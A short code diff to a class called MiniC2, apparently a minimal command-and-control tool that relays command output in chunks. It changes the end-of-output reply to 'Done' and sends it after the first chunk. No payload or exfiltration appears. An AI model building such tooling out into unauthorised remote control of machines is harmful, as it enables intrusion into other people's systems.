@@ -113,7 +113,7 @@ class MiniC2:
     def _handle_more(self, cmd_id: str, destination_id: Optional[str]) -> None:
         chunk = self.output_buffer.pop_next(cmd_id)
         if not chunk:
-            self._send_text(f"MSG-ID:{cmd_id}\nNo more output", destination_id=destination_id)
+            self._send_text(f"MSG-ID:{cmd_id}\nDone", destination_id=destination_id)
             return
         self._send_text(chunk, destination_id=destination_id)
 
@@ -149,6 +149,7 @@ class MiniC2:
                 first_chunk = chunks.popleft()
                 first_chunk = f"{first_chunk}\n{timing_line}"
                 self._send_text_repeated(first_chunk, destination_id=destination_id)
+                self._send_text(f"MSG-ID:{cmd_id}\nDone", destination_id=destination_id)
                 return
 
             ack = ACK_TEMPLATE.format(cmd_id=cmd_id, host=self.host, command=command)
